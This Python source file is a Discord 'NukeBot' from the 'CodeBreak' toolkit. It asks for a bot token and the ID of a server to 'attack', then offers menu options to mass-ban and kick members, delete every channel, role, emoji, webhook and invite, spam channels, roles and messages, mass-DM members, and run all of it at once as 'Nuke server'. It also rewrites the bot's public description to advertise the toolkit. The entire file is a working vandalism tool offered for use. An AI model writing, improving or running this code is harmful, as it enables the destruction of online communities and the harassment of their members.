# © 2024 CIPIX
# All rights reserved.
# Tous droits réservés.

try :
    import sys, os, discord, asyncio, random, aioconsole
    sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    from config.info import *
    from config.config import *
    from config.menu import *
    from discord.ext import commands
    from discord import Activity, ActivityType
except Exception as e :
    errorModule(e)

terminalTitle('NukeBot')
Pause()
CLEAR()
print(NukeBotTitle, LINK)

def enterToken():
    print(f'{TIME()} {INPUT} please enter the bot token !\n{reset}')
    global token
    token = input(Prompt('NukeBot'))
    data["token"] = token
    Sauvegarde()

def censureString(s):
    if data["censureToken"] == "True" :
        censored_part = '#' * (len(s) - 5)
        visible_part = s[-5:]
        return censored_part + visible_part
    else :
        return s

if data["token"] == 'null':
    enterToken()
else:
    while True:
        print(f'{TIME()} {INFO} token : {censureString(data["token"])}{reset}')
        print(f'{TIME()} {INPUT} do you want to change the token ? {green}[y] {purple}| {red}[n] \n{reset}')
        choice = input(Prompt('NukeBot'))
        if choice.lower().strip() == 'y' :
            print('')
            enterToken()
            break
        elif choice.lower().strip() == 'n' :
            token = data["token"]
            break
        else :
            print(f'\n{TIME_RED()} {ERROR} The choice is not recognized as a valid option !{reset}')

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.integrations = True
intents.voice_states = True
intents.message_content = True
intents.guild_messages = True
bot = commands.Bot(command_prefix="!", intents=intents)
current_guild_id = None
current_delay = 50

async def botInfo():
    invite_url = f"https://discord.com/oauth2/authorize?client_id={bot.user.id}&scope=bot&permissions=8"
    name = bot.user.name
    bot_id = bot.user.id
    guild = bot.get_guild(current_guild_id)
    print(f"""{TIME_RED()} {INFO_RED} Bot Informations:
        {purple}● Token  : {white}{censureString(token)}
        {purple}● Invite : {white}{invite_url}
        {purple}● Bot    : {white}{name} ({bot_id})
        {purple}● Guild  : {white}{guild.name} ({current_guild_id})
        {purple}● Delay  : {white}{current_delay}\n""")

async def botStartSet():
    await bot.change_presence(activity=Activity(type=ActivityType.watching, name=f"{linkGithubSimple}"))
    bot_id = bot.user.id
    NEW_DESCRIPTION = f':flag_fr: :flag_gb: CodeBreak is best free multi-tools, come in discord server for more :\n**:sparkles: > {linkDiscord} \n:sparkles: > {linkGithub} **'
    url = f'https://discord.com/api/v10/applications/{bot_id}'
    headers = {
    'Authorization': f'Bot {token}',
    'Content-Type': 'application/json'}
    payload = {
    'description': NEW_DESCRIPTION}
    try :
        requests.patch(url, headers=headers, json=payload)
    except :
        pass

async def ban_all(guild_id, delay):
    guild = bot.get_guild(int(guild_id))
    exclude_ids = data.get('excludeIds', [])
    
    if not guild.me.guild_permissions.ban_members:
        print(f"{TIME_RED()} {ERROR} Bot does not have permission to ban members.")
        Pause()
        return

    try:
        async for member in guild.fetch_members(limit=None):
            if str(member.id) not in exclude_ids:
                if guild.me.top_role.position > member.top_role.position:
                    try:
                        await member.ban(reason="CodeBreak Nuke Serveur")
                        print(f"{TIME_GREEN()} {INFO_GREEN} Banned {member}.")
                        await asyncio.sleep(delay / 1000)
                    except discord.Forbidden:
                        print(f"{TIME_RED()} {ERROR} Failed to ban {member}: insufficient permissions.")
                    except discord.HTTPException as e:
                        print(f"{TIME_RED()} {ERROR} Failed to ban {member}: {e}")
                else:
                    print(f"{TIME_RED()} {ERROR} Cannot ban {member}: role hierarchy issue.")
            else:
                print(f"{TIME_YELLOW()} {INFO_YELLOW} Skipping ban for {member}.")
    except discord.HTTPException as e:
        print(f"{TIME_RED()} {ERROR} Error fetching members: {e}")  
    Pause()

async def kick_all(guild_id, delay):
    guild = bot.get_guild(int(guild_id))
    exclude_ids = data.get('excludeIds', [])
    
    if not guild.me.guild_permissions.kick_members:
        print(f"{TIME_RED()} {ERROR} Bot does not have permission to kick members.")
        Pause()
        return

    try:
        async for member in guild.fetch_members(limit=None):
            if str(member.id) not in exclude_ids:
                if guild.me.top_role.position > member.top_role.position:
                    try:
                        await member.kick(reason="Automated kick")
                        print(f"{TIME_GREEN()} {INFO_GREEN} Kicked {member}.")
                        await asyncio.sleep(delay / 1000)
                    except discord.Forbidden:
                        print(f"{TIME_RED()} {ERROR} Failed to kick {member}: insufficient permissions or role hierarchy issue.")
                    except discord.HTTPException as e:
                        print(f"{TIME_RED()} {ERROR} Failed to kick {member}: {e}")
                else:
                    print(f"{TIME_RED()} {ERROR} Cannot kick {member}: role hierarchy issue.")
            else:
                print(f"{TIME_YELLOW()} {INFO_YELLOW} Skipping kick for {member}.")
    except discord.HTTPException as e:
        print(f"{TIME_RED()} {ERROR} Error fetching members: {e}")
    
    Pause()

async def delete_all_channels(guild_id, delay):
    guild = bot.get_guild(int(guild_id))
    
    if not guild.me.guild_permissions.manage_channels:
        print(f"{TIME_RED()} {ERROR} Bot does not have permission to manage channels.")
        Pause()
        return

    try:
        for channel in guild.channels:
            if channel.permissions_for(guild.me).manage_channels:
                try:
                    await channel.delete()
                    print(f"{TIME_GREEN()} {INFO_GREEN} Deleted channel {channel}.")
                    await asyncio.sleep(delay / 1000)
                except discord.Forbidden:
                    print(f"{TIME_RED()} {ERROR} Failed to delete channel {channel}: insufficient permissions.")
                except discord.HTTPException as e:
                    print(f"{TIME_RED()} {ERROR} Failed to delete channel {channel}.")
            else:
                print(f"{TIME_RED()} {ERROR} Cannot delete channel {channel}: insufficient permissions.")
    except discord.HTTPException as e:
        print(f"{TIME_RED()} {ERROR} Error deleting channels: {e}")
    Pause()

async def delete_all_roles(guild_id, delay):
    guild = bot.get_guild(int(guild_id))
    
    if not guild.me.guild_permissions.manage_roles:
        print(f"{TIME_RED()} {ERROR} Bot does not have permission to manage roles.")
        Pause()
        return

    try:
        roles = sorted(guild.roles, key=lambda r: r.position, reverse=True)
        for role in roles:
            if role.name == '@everyone' and role.position < guild.me.top_role.position:
                print(f"{TIME_YELLOW()} {INFO_YELLOW} Cannot delete role {role}.")
                continue
            try:
                await role.delete()
                print(f"{TIME_GREEN()} {INFO_GREEN} Deleted role {role}.")
                await asyncio.sleep(delay / 1000)
            except discord.Forbidden:
                print(f"{TIME_RED()} {ERROR} Failed to delete role {role}: insufficient permissions.")
            except discord.HTTPException as e:
                print(f"{TIME_RED()} {ERROR} Failed to delete role {role}: {e}")
    except discord.HTTPException as e:
        print(f"{TIME_RED()} {ERROR} Error deleting roles: {e}")
    Pause()

async def delete_all_emojis(guild_id, delay):
    guild = bot.get_guild(int(guild_id))
    
    if not guild.me.guild_permissions.manage_emojis:
        print(f"{TIME_RED()} {ERROR} Bot does not have permission to manage emojis.")
        Pause()
        return

    try:
        for emoji in guild.emojis:
            try:
                await emoji.delete(reason="Automated emoji deletion")
                print(f"{TIME_GREEN()} {INFO_GREEN} Deleted emoji {emoji}.")
                await asyncio.sleep(delay / 1000)
            except discord.Forbidden:
                print(f"{TIME_RED()} {ERROR} Failed to delete emoji {emoji}: insufficient permissions.")
            except discord.HTTPException as e:
                print(f"{TIME_RED()} {ERROR} Failed to delete emoji {emoji}: {e}")
    except discord.HTTPException as e:
        print(f"{TIME_RED()} {ERROR} Error fetching emojis: {e}")
    Pause()

async def delete_all_webhooks(guild_id, delay):
    guild = bot.get_guild(int(guild_id))
    
    if not guild.me.guild_permissions.manage_webhooks:
        print(f"{TIME_RED()} {ERROR} Bot does not have permission to manage webhooks.")
        Pause()
        return

    try:
        webhooks = await guild.webhooks()
        for webhook in webhooks:
            try:
                await webhook.delete(reason="Automated webhook deletion")
                print(f"{TIME_GREEN()} {INFO_GREEN} Deleted webhook {webhook}.")
                await asyncio.sleep(delay / 1000)
            except discord.Forbidden:
                print(f"{TIME_RED()} {ERROR} Failed to delete webhook {webhook}: insufficient permissions.")
            except discord.HTTPException as e:
                print(f"{TIME_RED()} {ERROR} Failed to delete webhook {webhook}: {e}")
    except discord.HTTPException as e:
        print(f"{TIME_RED()} {ERROR} Error fetching webhooks: {e}")
    Pause()

async def delete_all_invites(guild_id, delay):
    guild = bot.get_guild(int(guild_id))
    
    if not guild.me.guild_permissions.manage_guild:
        print(f"{TIME_RED()} {ERROR} Bot does not have permission to manage invites.")
        Pause()
        return

    try:
        invites = await guild.invites()
        for invite in invites:
            try:
                await invite.delete(reason="Automated invite deletion")
                print(f"{TIME_GREEN()} {INFO_GREEN} Deleted invite {invite}.")
                await asyncio.sleep(delay / 1000)
            except discord.Forbidden:
                print(f"{TIME_RED()} {ERROR} Failed to delete invite {invite}: insufficient permissions.")
            except discord.HTTPException as e:
                print(f"{TIME_RED()} {ERROR} Failed to delete invite {invite}: {e}")
    except discord.HTTPException as e:
        print(f"{TIME_RED()} {ERROR} Error fetching invites: {e}")
    Pause()

async def spam_message(guild_id, delay):
    guild = bot.get_guild(int(guild_id))
    
    message = await aioconsole.ainput("Please enter the message to spam: ")

    while True:
        times_input = await aioconsole.ainput("Please enter the number of spam messages to be sent to each text channel: ")
        if times_input.isdigit():
            times = int(times_input)
            break
        else:
            print(f"{TIME_RED()} {ERROR} Please enter a valid number.")

    try:
        for _ in range(times):
            for channel in guild.text_channels:
                if channel.permissions_for(guild.me).send_messages:
                    try:
                        await channel.send(message)
                        print(f"{TIME_GREEN()} {INFO_GREEN} Sent message to {channel}.")
                        await asyncio.sleep(delay / 1000)
                    except discord.Forbidden:
                        print(f"{TIME_RED()} {ERROR} Failed to send message to {channel}: insufficient permissions.")
                    except discord.HTTPException as e:
                        print(f"{TIME_RED()} {ERROR} Failed to send message to {channel}: {e}")
                else:
                    print(f"{TIME_RED()} {ERROR} Cannot send message to {channel}: insufficient permissions.")
    except Exception as e:
        print(f"{TIME_RED()} {ERROR} Error spamming message: {e}")
    Pause()

async def rename_server(guild_id):
    guild = bot.get_guild(int(guild_id))
    
    if not guild.me.guild_permissions.manage_guild:
        print(f"{TIME_RED()} {ERROR} Bot does not have permission to manage the server.")
        Pause()
        return

    new_name = await aioconsole.ainput("Please enter the new name for the server: ")

    if not new_name.strip():
        print(f"{TIME_RED()} {ERROR} The server name cannot be empty.")
        Pause()
        return

    if len(new_name) > 100:
        print(f"{TIME_RED()} {ERROR} The server name cannot be longer than 100 characters.")
        Pause()
        return

    try:
        await guild.edit(name=new_name)
        print(f"{TIME_GREEN()} {INFO_GREEN} Server renamed to {new_name}.")
    except discord.Forbidden:
        print(f"{TIME_RED()} {ERROR} Failed to rename server: insufficient permissions.")
    except discord.HTTPException as e:
        print(f"{TIME_RED()} {ERROR} Failed to rename server: {e}")
    Pause()

async def create_channels(guild_id, delay):
    guild = bot.get_guild(guild_id)
    if not guild.me.guild_permissions.manage_channels:
        print(f"{TIME_RED()} {ERROR} Bot does not have permission to manage channels.")
        Pause()
        return

    base_name = await aioconsole.ainput("Please enter the base name for the channels: ")

    while True:
        num_channels_input = await aioconsole.ainput("Please enter the number of channels to create (max 200): ")
        if num_channels_input.isdigit():
            num_channels = int(num_channels_input)
            if 1 <= num_channels <= 200:
                break
            else:
                print(f"{TIME_RED()} {ERROR} Number of channels must be between 1 and 200.")
        else:
            print(f"{TIME_RED()} {ERROR} Please enter a valid number.")

    try:
        for i in range(num_channels):
            await asyncio.sleep(delay / 1000)
            await guild.create_text_channel(f"{base_name} - {i}")
            print(f"{TIME_GREEN()} {INFO_GREEN} Channel created: {base_name} - {i}.")
    except discord.Forbidden:
        print(f"{TIME_RED()} {ERROR} Failed to create channels: insufficient permissions.")
    except discord.HTTPException as e:
        print(f"{TIME_RED()} {ERROR} Failed to create channels: {e}")
    Pause()

async def send_dm_to_members(guild_id):
    guild = bot.get_guild(guild_id)
    if not guild.me.guild_permissions.read_messages:
        print(f"{TIME_RED()} {ERROR} Bot does not have permission to read messages in this guild.")
        Pause()
        return

    message = await aioconsole.ainput("Please enter the message to send as DM: ")
    if not message.strip():
        print(f"{TIME_RED()} {ERROR} The message cannot be empty.")
        Pause()
        return

    try:
        members = guild.members
        for member in members:
            if not member.bot:
                try:
                    await member.send(message)
                    print(f"{TIME_GREEN()} {INFO_GREEN} DM sent to {member}.")
                except discord.Forbidden:
                    print(f"{TIME_RED()} {ERROR} Failed to send DM to {member}: cannot send DMs.")
                except discord.HTTPException as e:
                    print(f"{TIME_RED()} {ERROR} Failed to send DM to {member}: {e}")
                except Exception as e:
                    print(f"{TIME_RED()} {ERROR} An unexpected error occurred while sending DM to {member}: {e}")
    except discord.HTTPException as e:
        print(f"{TIME_RED()} {ERROR} Error fetching members: {e}")
    Pause()

colors = [
    '#FF0000', '#FF4D4D', '#FF6666', '#FF9999', '#FFCCCC', 
    '#FFB3B3', '#FF8C8C', '#FF6666', '#FF4D4D', '#FF3333', 
    '#FF4D00', '#FF6600', '#FF7F00', '#FF8C00', '#FF9900', 
    '#FFB300', '#FFCC00', '#FFFF00', '#FFFF66', '#FFFF99', 
    '#CCFF00', '#99FF00', '#66FF00', '#33FF00', '#00FF00',
    '#00FF33', '#00FF66', '#00FF99', '#00FFCC', '#00FFFF',
    '#00CCCC', '#00B3E0', '#00A3E0', '#0099FF', '#007FFF',
    '#005BFF', '#0033FF', '#0000FF', '#4D00FF', '#7F00FF',
    '#A600FF', '#BF00FF', '#D700FF', '#E700FF', '#F500FF',
    '#FF00CC', '#FF00B3', '#FF0099', '#FF007F', '#FF004D',
    '#F5F5F5', '#E0E0E0', '#CCCCCC', '#B3B3B3', '#999999',
    '#808080', '#666666', '#4D4D4D', '#333333', '#000001'
]

def get_random_color():
    return random.choice(colors)

async def create_roles(guild_id, delay):
    guild = bot.get_guild(guild_id)
    if not guild.me.guild_permissions.manage_roles:
        print(f"{TIME_RED()} {ERROR} Bot does not have permission to manage roles.")
        Pause()
        return

    role_name = await aioconsole.ainput("Please enter the base name for the roles: ")
    max_roles = 200

    while True:
        num_roles_input = await aioconsole.ainput(f"Please enter the number of roles to create (max {max_roles}): ")
        if num_roles_input.isdigit():
            num_roles = int(num_roles_input)
            if 1 <= num_roles <= max_roles:
                break
            else:
                print(f"{TIME_RED()} {ERROR} Please enter a valid number between 1 and {max_roles}.")
        else:
            print(f"{TIME_RED()} {ERROR} Please enter a valid number.")

    try:
        special_role = await guild.create_role(name='☢️Hack with CodeBreak☢️', color=discord.Color(0xF7FF00))
        print(f"{TIME_GREEN()} {INFO_GREEN} Role created: {special_role.name}")

        for i in range(1, num_roles + 1):
            role_name_final = f"{role_name} - {i}"
            color_code = get_random_color()
            role_color = discord.Color(int(color_code.replace("#", ""), 16))
            role = await guild.create_role(name=role_name_final, color=role_color)
            print(f"{TIME_GREEN()} {INFO_GREEN} Role created: {role.name}")
            await asyncio.sleep(delay / 1000)

        print(f"{TIME_GREEN()} {INFO_GREEN} {num_roles} roles were successfully created.")
    except discord.Forbidden:
        print(f"{TIME_RED()} {ERROR} Failed to create roles: insufficient permissions.")
    except discord.HTTPException as e:
        print(f"{TIME_RED()} {ERROR} Failed to create roles: {e}")
    except Exception as e:
        print(f"{TIME_RED()} {ERROR} An unexpected error occurred: {e}")
    Pause()

async def manage_settings():
    global current_guild_id, current_delay, data
           
    while True:
        CLEAR()
        print(NukeBotTitle)
        await botInfo()
        print(f"\n{TIME()} {INFO} Current Guild ID: {current_guild_id}\n{TIME()} {INFO} Current Delay: {current_delay}ms\n")
        print(f"{TIME()} {INPUT} What do you want to modify?\n           [{white}1{purple}] Guild ID\n           [{white}2{purple}] Delay\n           [{white}3{purple}] Manage Exclusion List\n           [{white}4{purple}] Exit\n")
        choice = (await aioconsole.ainput(Prompt('NukeBot'))).lower()

        if choice == "1":
            print(f"\n{TIME()} {INPUT} Please enter the new guild ID.\n")
            guild_id_input = await aioconsole.ainput(Prompt('NukeBot'))
            try:
                guild_id = int(guild_id_input)
                guild = bot.get_guild(guild_id)
                if guild:
                    current_guild_id = guild.id
                    print(f"\n{TIME_GREEN()} {ADD_GREEN} Guild ID updated to {current_guild_id}")
                else:
                    print(f"\n{TIME_RED()} {ERROR} Invalid guild ID")
            except ValueError:
                print(f"\n{TIME_RED()} {ERROR} Invalid guild ID format")
            Pause()

        elif choice == "2":
            print(f"\n{TIME()} {INPUT} Please enter the delay (in milliseconds).\n")
            new_delay_input = await aioconsole.ainput(Prompt('NukeBot'))
            try:
                new_delay = int(new_delay_input)
                if new_delay > 0:
                    current_delay = new_delay
                    print(f"\n{TIME_GREEN()} {ADD_GREEN} Delay updated to {current_delay}ms")
                else:
                    print(f"\n{TIME_RED()} {ERROR} Delay must be a positive number.")
            except ValueError:
                print(f"\n{TIME_RED()} {ERROR} Delay should be a number.")
            Pause()

        elif choice == "3":
            exclude_ids = data.get('excludeIds', [])
            while True:
                CLEAR()
                print(NukeBotTitle)
                await botInfo()
                print(f"\n{TIME()} {INPUT} Manage exclusion list:\n\n           [{white}1{purple}] Add user to whitelist\n           [{white}2{purple}] Remove user from whitelist\n           [{white}3{purple}] View exclusion list\n           [{white}4{purple}] Back\n")
                exclusion_choice = (await aioconsole.ainput(Prompt('NukeBot'))).lower()

                if exclusion_choice == "1":
                    print(f'\n{TIME()} {INPUT} Enter user ID to add whitelist\n')
                    add_id = await aioconsole.ainput(Prompt('NukeBot'))
                    if add_id not in exclude_ids:
                        exclude_ids.append(add_id)
                        print(f"\n{TIME_GREEN()} {INFO_GREEN} User ID {add_id} added to exclusion list")
                        data['excludeIds'] = exclude_ids
                        Sauvegarde()
                    else:
                        print(f"\n{TIME_YELLOW()} {INFO_YELLOW} User ID {add_id} is already in the exclusion list")
                    Pause()
                elif exclusion_choice == "2":
                    print(f'\n{TIME()} {INPUT} Enter user ID to remove whitelist\n')
                    remove_id = await aioconsole.ainput(Prompt('NukeBot'))
                    if remove_id in exclude_ids:
                        exclude_ids.remove(remove_id)
                        print(f"\n{TIME_GREEN()} {INFO_GREEN} User ID {remove_id} removed from exclusion list")
                        data['excludeIds'] = exclude_ids
                        Sauvegarde()
                    else:
                        print(f"\n{TIME_YELLOW()} {INFO_YELLOW} User ID {remove_id} is not in the exclusion list")
                    Pause()
                elif exclusion_choice == "3":
                    print(f"\n{TIME_YELLOW()} {INFO_YELLOW} Exclusion list: {', '.join(exclude_ids)}")
                    Pause()
                elif exclusion_choice == "4":
                    break
                else:
                    print(f"\n{TIME_RED()} {ERROR} Invalid option! Please choose a valid option.")
                    Pause()

        elif choice == "4":
            print(f"\n{TIME_YELLOW()} {INFO_YELLOW} Exiting settings menu...")
            break

        else:
            print(f"\n{TIME_RED()} {ERROR} Invalid option! Please choose a valid option.")
            Pause()

async def all(guild, delay):
    try:
        print(f"{TIME_YELLOW()} {WAIT_YELLOW} Starting the 'ban_all' process...")
        await ban_all(guild, delay)
        print("――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――")
        Pause()

        print(f"{TIME_YELLOW()} {WAIT_YELLOW} Starting the 'delete_all_channels' process...")
        await delete_all_channels(guild, delay)
        print("――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――")
        Pause()

        print(f"{TIME_YELLOW()} {WAIT_YELLOW} Starting the 'delete_all_webhooks' process...")
        await delete_all_webhooks(guild, delay)
        print("――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――")
        Pause()

        print(f"{TIME_YELLOW()} {WAIT_YELLOW} Starting the 'delete_all_roles' process...")
        await delete_all_roles(guild, delay)
        print("――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――")
        Pause()

        print(f"{TIME_YELLOW()} {WAIT_YELLOW} Starting the 'delete_all_emojis' process...")
        await delete_all_emojis(guild, delay)
        print("――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――")
        Pause()

        print(f"{TIME_YELLOW()} {WAIT_YELLOW} Starting the 'delete_all_invites' process...")
        await delete_all_invites(guild, delay)
        print("――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――")
        Pause()

        print(f"{TIME_GREEN()} {INFO_GREEN} Successfully executed ALL actions")
    except discord.Forbidden:
        print(f"{TIME_RED()} {ERROR} Failed to execute all actions: Bot lacks required permissions.")
    except discord.HTTPException as e:
        print(f"{TIME_RED()} {ERROR} HTTP error occurred: {e}")
    except Exception as e:
        print(f"{TIME_RED()} {ERROR} An unexpected error occurred: {e}")
    Pause()

async def discordMenu():
    while True:
        try :
            CLEAR()
            print(NukeBotTitle)
            await botInfo()
            MENU(BotOption)
            choiceInput = await aioconsole.ainput(Prompt('NukeBot'))
            choice = choiceInput.strip()
            if choice == "1":
                await ban_all(current_guild_id, current_delay)
            elif choice == "2":
                await kick_all(current_guild_id, current_delay)
            elif choice == "3":
                await delete_all_invites(current_guild_id, current_delay)
            elif choice == "4":
                await delete_all_channels(current_guild_id, current_delay)
            elif choice == "5":
                await delete_all_roles(current_guild_id, current_delay)
            elif choice == "6":
                await delete_all_emojis(current_guild_id, current_delay)
            elif choice == "7":
                await delete_all_webhooks(current_guild_id, current_delay)
            elif choice == "8":
                await create_channels(current_guild_id, current_delay)
            elif choice == "9":
                await create_roles(current_guild_id, current_delay)
            elif choice == "10":
                await send_dm_to_members(current_guild_id)
            elif choice == "11":
                await spam_message(current_guild_id, current_delay)
            elif choice == "12":
                await rename_server(current_guild_id)
            elif choice == "13":
                await all(current_guild_id, current_delay)
            elif choice == "14":
                await manage_settings()
            elif choice == "15":
                print(f'\n{TIME_YELLOW()} {WAIT_YELLOW} Bot shutdown in progress...')
                await bot.close()
                break
            else:
                print(f'\n{TIME_RED()} {ERROR} The choice is not recognized as a valid option !{reset}')
        except Exception as error:
            print(f'\n{TIME_RED()} {ERROR} An error occurred: {error}{reset}')
            await Pause()
            break

BotOption = [
    {"num": 1, "titre": "Ban all user"},
    {"num": 6, "titre": "Delete all emojies"},
    {"num": 11, "titre": "Spam messages"},
    {"num": 2, "titre": "Kick all user"},
    {"num": 7, "titre": "Delete all webhooks"},
    {"num": 12, "titre": "Rename server"},
    {"num": 3, "titre": "Delete all invites"},
    {"num": 8, "titre": "Spam Channels"},
    {"num": 13, "titre": "Nuke server"},
    {"num": 4, "titre": "Delete all channels"},
    {"num": 9, "titre": "Spam roles"},
    {"num": 14, "titre": "Settings + Whitelist"},
    {"num": 5, "titre": "Delete all roles"},
    {"num": 10, "titre": "DM all user"},
    {"num": 15, "titre": "Main Menu"},
]

async def first_manage_settings():
    global current_guild_id, current_delay

    while True :
        print(f'{TIME()} {INPUT} Please enter the guild ID you want to attack.\n')
        guild_id_str = await aioconsole.ainput(Prompt('NukeBot'))
        if not guild_id_str.isdigit():
            print(f"\n{TIME_RED()} {ERROR} Invalid guild ID format (must be a numeric ID).")
            continue
        guild_id = int(guild_id_str)
        try:
            guild = await bot.fetch_guild(guild_id)
            if not guild:
                print(f"\n{TIME_RED()} {ERROR} Invalid guild ID (the bot must be in the server)")
            else:
                current_guild_id = guild.id
                break
        except discord.NotFound:
            print(f"\n{TIME_RED()} {ERROR} Guild not found (the bot might not be on this server).")
        except discord.Forbidden:
            print(f"\n{TIME_RED()} {ERROR} Forbidden to fetch guild (check bot permissions).")
        except discord.HTTPException as e:
            print(f"\n{TIME_RED()} {ERROR} HTTP Exception occurred: {e}")

    print(f"\n{TIME()} {INPUT} Please enter the delay (in milliseconds) (default is 50ms).\n")
    delay = await aioconsole.ainput(Prompt('NukeBot'))
    if not delay or not delay.isdigit():
        delay = 50
    current_delay = int(delay)
    print('')
    Pause()

@bot.event
async def on_ready():
    print(f"{TIME_GREEN()} {ADD_GREEN} The NukeBot is ready and online !{reset}")
    invite_url = f"https://discord.com/oauth2/authorize?client_id={bot.user.id}&scope=bot&permissions=8"
    print(f"{TIME()} {INFO} Bot invitation :{yellow} {invite_url} {reset}")
    await botStartSet()
    await first_manage_settings()
    print(f'{TIME_YELLOW()} {WAIT_YELLOW} Loading menu...')
    await discordMenu()

try :
    print(f'\n{TIME_YELLOW()} {WAIT_YELLOW} bot starting in progress...')
    bot.run(token, log_handler=None)
    print(f'{TIME_GREEN()} {ADD_GREEN} the bot is turned off')
    Pause()
    mainMenu()
except Exception as error : 
    print(f'{TIME_RED()} {ERROR} error : {error}')
    Pause()